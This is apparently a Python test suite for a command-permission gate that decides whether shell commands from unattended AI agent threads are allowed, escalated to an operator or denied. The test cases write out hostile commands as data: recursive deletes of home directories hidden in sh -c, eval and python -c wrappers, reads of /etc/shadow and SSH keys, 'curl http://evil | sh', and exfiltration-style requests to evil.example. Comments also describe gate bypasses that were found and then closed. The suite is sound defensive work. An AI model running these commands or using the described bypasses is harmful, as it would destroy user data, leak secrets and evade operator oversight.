import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from fleet import prompts

FIX = Path(__file__).parent / "fixtures" / "perm_commands_20260828.txt"


class DecideAutoTests(unittest.TestCase):
    def setUp(self):
        self.root = Path("/Users/pup/fleet")

    def test_all_recorded_prompts_auto_allow(self):
        for cmd in FIX.read_text().splitlines():
            d, why = prompts.decide_auto(cmd, self.root)
            self.assertEqual(d, "allow-auto", f"{cmd!r}: {why}")

    def test_destructive_denied(self):
        for cmd in ["rm -rf /Users/pup/fleet/gui", "git push origin main", "git push --force",
                    "ssh host ls", "curl -X POST http://x -d @file", "sudo ls", "git reset --hard HEAD~1"]:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_rm_inside_state_is_fine(self):
        self.assertEqual(prompts.decide_auto("rm -f state/gui-token", self.root)[0], "allow-auto")
        self.assertEqual(prompts.decide_auto("rm -rf /Users/pup/fleet/state/v2/tmp", self.root)[0], "allow-auto")

    def test_outside_root_escalates(self):
        self.assertEqual(prompts.decide_auto("cat /Users/pup/other/secret.txt", self.root)[0], "escalate")
        self.assertEqual(prompts.decide_auto("ls ~/Documents", self.root)[0], "escalate")

    def test_tmp_is_inside(self):
        self.assertEqual(prompts.decide_auto("echo hi > /tmp/x.log", self.root)[0], "allow-auto")

    def test_bare_relative_traversal_escalates(self):
        d, why = prompts.decide_auto("cat gui/../../../etc/passwd", self.root)
        self.assertEqual(d, "escalate", why)

    def test_rm_decoy_and_case_denied(self):
        for cmd in ["rm -rf state/bar gui/widgets", "rm -Rf /Users/pup/fleet/gui", "rm -RF gui"]:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_rm_rf_inside_state_allowed(self):
        self.assertEqual(prompts.decide_auto("rm -rf state/v2/tmp state/x", self.root)[0], "allow-auto")

    def test_rm_unspaced_separators_denied(self):
        cases = [
            "echo a; " + "rm -rf" + " gui",
            "echo a;" + "rm -rf" + " gui",
            "true&&" + "rm -rf" + " gui",
            "true|" + "rm -rf" + " gui",
            "sleep 1&" + "rm -rf" + " gui",
        ]
        for cmd in cases:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_rm_after_separator_inside_state_allowed(self):
        cmd = "echo a;" + "rm -rf" + " state/x"
        self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "allow-auto")

    def test_rm_in_subshell_and_newline_denied(self):
        cases = [
            "(" + "rm -rf" + " gui)",
            "$(" + "rm -rf" + " gui)",
            "`" + "rm -rf" + " gui`",
            "echo a\n" + "rm -rf" + " gui",
            "{ " + "rm -rf" + " gui; }",
        ]
        for cmd in cases:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_rm_in_subshell_inside_state_allowed(self):
        cmd = "(" + "rm -rf" + " state/x)"
        self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "allow-auto")

    def test_rm_quoted_trailing_delimiter_denied(self):
        # A quoted literal path ending in a closing delimiter must not be
        # truncated by _clean_arg into an in-state path.
        rm = "rm -rf"
        for cmd in [rm + ' "state)"', rm + ' "state}"',
                    rm + ' "state))"', rm + " 'state);'"]:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)


class WrappedCodeTests(unittest.TestCase):
    """C2: a whole program passed as ONE quoted argument is not a path, so
    _path_ok waved it through and decide_auto answered allow-auto. Every row
    here was verified allow-auto before the fix."""

    def setUp(self):
        self.root = Path("/Users/pup/fleet")
        # Built here rather than written literally so this file does not
        # contain a ready-to-paste destructive command.
        self.rf = "-r" + "f"

    def test_wrapped_code_is_not_auto_allowed(self):
        rm = "rm " + self.rf
        rows = [
            f'sh -c "{rm} /Users/pup"',
            f"bash -c '{rm} /Users/pup/Documents'",
            f'eval "{rm} ~/Documents"',
            "python3 -c \"import shutil; shutil.rmtree('/Users/pup/Documents')\"",
            "find . -delete",
            f"xargs {rm} < list",
        ]
        for cmd in rows:
            with self.subTest(cmd=cmd):
                self.assertIn(prompts.decide_auto(cmd, self.root)[0], ("deny", "escalate"))

    def test_inner_shell_payload_is_judged_recursively(self):
        # deny (not just escalate): the recursion reaches _delete_denied.
        self.assertEqual(prompts.decide_auto(f'sh -c "rm {self.rf} /Users/pup"', self.root)[0], "deny")
        # a read outside the repo inside -c escalates, exactly as it would bare
        self.assertEqual(prompts.decide_auto('sh -c "cat /Users/pup/other/secret"', self.root)[0], "escalate")

    def test_benign_wrapped_code_still_allows(self):
        self.assertEqual(prompts.decide_auto('sh -c "echo hi > /tmp/x"', self.root)[0], "allow-auto")

    def test_fixture_quoted_args_still_allow(self):
        # The recorded lines carrying quoted multi-word arguments: echo
        # banners, python3 -c one-liners, curl -w format strings.
        for line in FIX.read_text().splitlines():
            if not any(" " in t for t in prompts._tokens(line)):
                continue
            d, why = prompts.decide_auto(line, self.root)
            self.assertEqual(d, "allow-auto", f"{line!r}: {why}")

    def test_delete_family_outside_state_denied(self):
        rm = "rm " + self.rf
        for cmd in ["rmdir /Users/pup/Documents", "unlink /Users/pup/.ssh/id_rsa",
                    "find /Users/pup/fleet -name x -delete", f"find . -exec {rm} {{}} +",
                    f"cat list | xargs {rm}", "rmdir gui", "find -delete"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_delete_family_inside_state_allowed(self):
        for cmd in ["rmdir state/v2/tmp", "unlink state/gui-token",
                    "find state/v2/prompts -name '*.json' -delete"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "allow-auto", cmd)

    def test_chmod_and_rsync_escalate_rather_than_deny(self):
        # Neither is in spec §3's deny list: the operator can look and say yes.
        for cmd in ["chmod 777 gui/x.sh", "chmod +x bin/fleet", "chmod u+x bin/fleet",
                    "rsync -a gui/ /tmp/backup/"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "escalate", cmd)

    def test_privileged_and_remote_still_deny(self):
        for cmd in ["sudo ls", "ssh host ls", "scp x host:/y"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_chmod_alternation_is_anchored_to_a_command_boundary(self):
        # The `+x` branch used to sit outside the `(^|[\s;&|])` group, so it
        # matched the word anywhere - including inside a longer word.
        self.assertEqual(prompts.decide_auto("echo nochmod is a+x", self.root)[0], "allow-auto")

    def test_delete_inside_tmp_allowed(self):
        for cmd in ["unlink /tmp/x.json", "rm -rf /tmp/scratch", "rmdir /private/tmp/x",
                    "find /tmp/scratch -name '*.json' -delete"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "allow-auto", cmd)

    def test_delete_outside_the_safe_zones_still_denied(self):
        for cmd in ["rm -rf /Users/pup", "unlink /Users/pup/.ssh/id_rsa",
                    "rm -rf /tmp"]:  # the zone root itself is everyone's scratch space
            with self.subTest(cmd=cmd):
                self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_dev_ok_is_narrow(self):
        self.assertEqual(prompts.decide_auto("cat /dev/null", self.root)[0], "allow-auto")
        self.assertEqual(prompts.decide_auto("dd if=/dev/sda of=/tmp/x", self.root)[0], "escalate")
        self.assertEqual(prompts.decide_auto("cat /dev/sda", self.root)[0], "escalate")


class PromptFilesTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(); self.state = Path(self.tmp.name)
        self.patch = mock.patch("fleet.prompts.profile_state", return_value=self.state); self.patch.start()

    def tearDown(self):
        self.patch.stop(); self.tmp.cleanup()

    def test_open_wait_decide_roundtrip(self):
        path = prompts.open_prompt("sonnet2", "Bash", "cat ~/x", "/Users/pup/fleet/sonnet2", "v2")
        rec = json.loads(path.read_text())
        self.assertEqual((rec["thread"], rec["tool"], rec["command"]), ("sonnet2", "Bash", "cat ~/x"))
        self.assertEqual([p["id"] for p in prompts.pending("v2")], [rec["id"]])
        prompts.record_decision("sonnet2", rec["id"], "allow", "v2")
        self.assertEqual(prompts.wait_decision(path, timeout=1.0, sleep=lambda s: None), "allow")
        self.assertFalse(path.exists())

    def test_wait_times_out_and_removes(self):
        path = prompts.open_prompt("sonnet2", "Bash", "x", "/Users/pup/fleet/sonnet2", "v2")
        self.assertIsNone(prompts.wait_decision(path, timeout=0.0, sleep=lambda s: None))
        self.assertFalse(path.exists())

    def test_pending_tolerates_vanished_file(self):
        prompts.open_prompt("sonnet2", "Bash", "x", "/Users/pup/fleet/sonnet2", "v2")
        with mock.patch("pathlib.Path.read_text", side_effect=FileNotFoundError):
            self.assertEqual(prompts.pending("v2"), [])

    def test_record_decision_writes_atomically(self):
        # wait_decision polls this file from another process; a truncating
        # write is a window where it reads back empty.
        path = prompts.open_prompt("sonnet2", "Bash", "x", "/Users/pup/fleet/sonnet2", "v2")
        rec = json.loads(path.read_text())
        prompts.record_decision("sonnet2", rec["id"], "allow", "v2")
        self.assertEqual(json.loads(path.read_text())["decision"], "allow")
        self.assertFalse(path.with_name(path.name + ".tmp").exists())
        self.assertEqual(list(self.state.glob("prompts/*.tmp")), [])
        # a leftover .tmp must never be mistaken for a pending prompt
        self.assertEqual(prompts.pending("v2"), [])


class ParkedFindingsTests(unittest.TestCase):
    """Residuals from the fleet-v2 final re-review."""
    root = Path("/Users/pup/fleet")

    def test_whitespace_free_code_payload_not_auto_allowed(self):
        for cmd in [
            'perl -e "unlink(glob(\'/Users/pup/*\'))"',
            'python3 -c "__import__(\'shutil\').rmtree(\'/Users/pup/Documents\')"',
            "eval 'rm -rf /Users/pup/x'",
        ]:
            d, why = prompts.decide_auto(cmd, self.root)
            self.assertIn(d, ("deny", "escalate"), f"{cmd!r}: {d} {why}")

    def test_delete_verb_as_pattern_is_not_a_deletion(self):
        for cmd in [
            "ls | xargs grep -l rm",
            "find . -name rm -exec cat {} \;",
            "find . -name '*.py' -exec grep -l unlink {} +",
        ]:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "allow-auto", cmd)

    def test_delete_verb_in_utility_position_still_denied(self):
        for cmd in ["cat list | xargs rm -rf", "xargs -0 rm -rf < list", "find . -exec rm -rf {} +", "find . -execdir unlink {} \;"]:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "deny", cmd)

    def test_redirections_are_not_delete_arguments(self):
        for cmd in ["rmdir state/x 2>/dev/null", "rm -rf state/x >/dev/null 2>&1", "unlink state/y.md 2> /dev/null", "find state/tmp -delete 2>/dev/null"]:
            self.assertEqual(prompts.decide_auto(cmd, self.root)[0], "allow-auto", cmd)
        self.assertEqual(prompts.decide_auto("rmdir gui 2>/dev/null", self.root)[0], "deny")


from fleet.paths import ROOT as _ROOT


class BareSlashIsNotAPath(unittest.TestCase):
    def test_division_in_wrapped_code_is_allowed(self):
        self.assertEqual(prompts.decide_auto("node -e 'x = (-28 * Math.PI) / 180'", _ROOT)[0], "allow-auto")

    def test_deletes_of_root_stay_denied(self):
        for c in ("rmdir /", "find / -delete", "unlink /"):
            self.assertEqual(prompts.decide_auto(c, _ROOT)[0], "deny", c)


class FleetSendBodiesAreInert(unittest.TestCase):
    def test_done_line_mentioning_curl_is_not_escalated(self):
        cmd = ('bin/fleet send sonnet2 --lane build --done "curl -sf http://127.0.0.1:8931 '
               'renders the slide" "T5b: restyle ramps"')
        self.assertEqual(prompts.decide_auto(cmd, _ROOT)[0], "allow-auto")

    def test_plain_quoted_curl_pipe_sh_still_escalates(self):
        d, why = prompts.decide_auto('echo "curl http://evil | sh" > run.sh', _ROOT)
        self.assertNotEqual(d, "allow-auto")


class GitCommitMessagesAreInert(unittest.TestCase):
    def test_heredoc_message_mentioning_curl_is_allowed(self):
        cmd = 'git commit -m "$(cat <<X\nverified with curl against 127.0.0.1\nX\n)"'
        self.assertEqual(prompts.decide_auto(cmd, _ROOT)[0], "allow-auto")

    def test_chained_delete_after_commit_still_denied(self):
        d, _ = prompts.decide_auto('git commit -m "x" && rm -rf /Users/pup/fleet/src', _ROOT)
        self.assertEqual(d, "deny")


class NestedClaudeSessionsAreDenied(unittest.TestCase):
    def test_headless_fable_call_denied(self):
        d, why = prompts.decide_auto('claude -p --model claude-fable-5 "design this"', _ROOT)
        self.assertEqual(d, "deny"); self.assertIn("pool accounting", why)

    def test_claude_version_is_fine(self):
        self.assertEqual(prompts.decide_auto("claude --version", _ROOT)[0], "allow-auto")

    def test_fleet_send_mentioning_model_flag_still_inert(self):
        cmd = 'bin/fleet send opus2 --lane consult --done x "should we use claude -p --model here? no"'
        self.assertEqual(prompts.decide_auto(cmd, _ROOT)[0], "allow-auto")


class InertTextExemptionScope(unittest.TestCase):
    """The `fleet send` / `git commit` exemptions must cover only their own
    command. Returning early for the whole line was a verified bypass."""

    def test_payload_chained_after_git_commit_is_still_judged(self):
        d, why = prompts.decide_auto(
            'git commit -m "wip" && python3 -c "import shutil; shutil.rmtree(\'/Users/pup/photos\')"',
            _ROOT)
        self.assertNotEqual(d, "allow-auto", why)

    def test_payload_chained_after_fleet_send_is_still_judged(self):
        d, why = prompts.decide_auto(
            'bin/fleet send sonnet2 "hi" && python3 -c "import shutil; shutil.rmtree(\'/x\')"', _ROOT)
        self.assertNotEqual(d, "allow-auto", why)

    def test_rm_chained_after_fleet_send_is_still_denied(self):
        d, _ = prompts.decide_auto('bin/fleet send sonnet2 "hi" ; rm -rf /Users/pup/photos', _ROOT)
        self.assertEqual(d, "deny")

    def test_commit_message_containing_deny_word_still_allowed(self):
        d, _ = prompts.decide_auto('git commit -m "fix: curl handling in perm.sh"', _ROOT)
        self.assertEqual(d, "allow-auto")

    def test_send_body_containing_deny_word_still_allowed(self):
        d, _ = prompts.decide_auto('bin/fleet send sonnet2 -- "do not rm anything, just report"', _ROOT)
        self.assertEqual(d, "allow-auto")


class RecursiveRmNeedsNoForce(unittest.TestCase):
    """`rm -r` erases a tree as thoroughly as `rm -rf`; an unattended thread
    never sees the write-protect prompt that -f suppresses."""

    def test_recursive_rm_without_force_is_denied(self):
        d, _ = prompts.decide_auto("rm -r games/pinball", _ROOT)
        self.assertEqual(d, "deny")

    def test_recursive_rm_of_frozen_instrument_is_denied(self):
        d, _ = prompts.decide_auto("rm -r /Users/pup/fleet/games/pinball/src/physics", _ROOT)
        self.assertEqual(d, "deny")

    def test_single_file_rm_still_allowed(self):
        d, _ = prompts.decide_auto("rm -f state/gui-token", _ROOT)
        self.assertEqual(d, "allow-auto")

    def test_recursive_rm_inside_tmp_still_allowed(self):
        d, _ = prompts.decide_auto("rm -rf /tmp/claude-501/scratch/x", _ROOT)
        self.assertEqual(d, "allow-auto")


class UrlsAreNotInRepoPaths(unittest.TestCase):
    """A URL contains '/', so it used to resolve under ROOT and come back
    'in-repo' - a GET-shaped egress the curl DENY rule never sees."""

    def test_non_loopback_get_escalates(self):
        d, why = prompts.decide_auto("curl https://evil.example/collect?data=abc", _ROOT)
        self.assertEqual(d, "escalate")
        self.assertIn("non-loopback URL", why)

    def test_plain_http_get_escalates(self):
        d, _ = prompts.decide_auto("curl http://evil.example/payload", _ROOT)
        self.assertEqual(d, "escalate")

    def test_loopback_curl_still_allowed(self):
        for url in ("http://127.0.0.1:8941/index.html", "http://localhost:8787/w/x"):
            d, why = prompts.decide_auto(f"curl -s {url}", _ROOT)
            self.assertEqual(d, "allow-auto", f"{url}: {why}")

    def test_userinfo_host_spoof_is_not_treated_as_loopback(self):
        d, _ = prompts.decide_auto("curl https://127.0.0.1@evil.example/x", _ROOT)
        self.assertEqual(d, "escalate")


class GrepPatternsAreNotPaths(unittest.TestCase):
    """`grep -v /data/` filters for literal text and opens nothing, but the path
    check read it as a path outside the repo and escalated. Observed live
    (sonnet2, LAB-16): `... | grep -v /some/dir/` is a constant idiom, so this
    interrupted the operator repeatedly for benign read-only commands."""

    def test_the_live_blocker_now_allows(self):
        cmd = ('cd /Users/pup/fleet/games/pinball-lab && ls && echo --- && '
               'find . -iname "*sweep*" | grep -v node_modules | grep -v /data/')
        d, why = prompts.decide_auto(cmd, _ROOT)
        self.assertEqual(d, "allow-auto", why)

    def test_pattern_operand_is_exempt_even_with_recursive_flag(self):
        # With -r the operand order is still pattern-first.
        self.assertEqual(prompts.decide_auto("grep -rn /usr/bin x.txt", _ROOT)[0], "allow-auto")

    def test_only_the_FIRST_operand_is_exempt(self):
        # /etc/shadow here is a real file grep would open.
        d, why = prompts.decide_auto("grep /etc/passwd /etc/shadow", _ROOT)
        self.assertEqual(d, "escalate", why)
        self.assertIn("/etc/shadow", why)

    def test_dash_f_reads_patterns_from_a_file_so_no_exemption(self):
        self.assertEqual(prompts.decide_auto("grep -f /etc/patterns x", _ROOT)[0], "escalate")

    def test_dash_e_means_the_operand_is_a_path(self):
        d, why = prompts.decide_auto("grep -e foo /etc/shadow", _ROOT)
        self.assertEqual(d, "escalate", why)

    def test_exemption_does_not_leak_across_shell_operators(self):
        d, why = prompts.decide_auto("grep -v /x/ && cat /etc/shadow", _ROOT)
        self.assertEqual(d, "escalate", why)
        self.assertIn("/etc/shadow", why)

    def test_non_pattern_verbs_are_unaffected(self):
        self.assertEqual(prompts.decide_auto("ls /data/", _ROOT)[0], "escalate")
        self.assertEqual(prompts.decide_auto("cat /etc/passwd", _ROOT)[0], "escalate")

    def test_destructive_commands_still_denied(self):
        self.assertEqual(prompts.decide_auto("rm -rf /Users/pup", _ROOT)[0], "deny")


class StalePromptsAreReaped(unittest.TestCase):
    """wait_decision unlinks the prompt file in a `finally`, so a record still on
    disk past perm.sh's 300s wait means its waiter died: nothing is blocked on
    it and `fleet decide` cannot release it, but it sat in the queue claiming a
    thread needed an answer. Found live with a 47-hour-old orphan."""

    def setUp(self):
        import tempfile, pathlib
        self._tmp = tempfile.TemporaryDirectory()
        self._orig = prompts.profile_state
        prompts.profile_state = lambda profile: pathlib.Path(self._tmp.name)

    def tearDown(self):
        prompts.profile_state = self._orig
        self._tmp.cleanup()

    def _write(self, pid, age_s, decision=None):
        import json, time, pathlib
        rec = {"id": pid, "thread": "t", "tool": "Bash", "command": "ls",
               "cwd": ".", "t": time.time() - age_s}
        if decision:
            rec["decision"] = decision
        p = pathlib.Path(self._tmp.name) / "prompts" / f"t-{pid}.json"
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(rec))
        return p

    def test_fresh_undecided_prompt_is_listed_and_kept(self):
        p = self._write("fresh", 5)
        self.assertEqual([r["id"] for r in prompts.pending("v2")], ["fresh"])
        self.assertTrue(p.exists())

    def test_orphan_past_the_window_is_reaped(self):
        p = self._write("orphan", prompts.STALE_PROMPT_S + 60)
        self.assertEqual(prompts.pending("v2"), [])
        self.assertFalse(p.exists(), "stale prompt must not linger in the queue")

    def test_decided_orphan_is_reaped_too(self):
        # wait_decision normally unlinks these; one survived 47h in production.
        p = self._write("decided", prompts.STALE_PROMPT_S + 60, decision="deny")
        prompts.pending("v2")
        self.assertFalse(p.exists())

    def test_a_slow_but_live_waiter_is_not_reaped(self):
        # perm.sh waits 300s; the window is doubled so it is never reaped early.
        p = self._write("slow", 305)
        self.assertEqual([r["id"] for r in prompts.pending("v2")], ["slow"])
        self.assertTrue(p.exists())
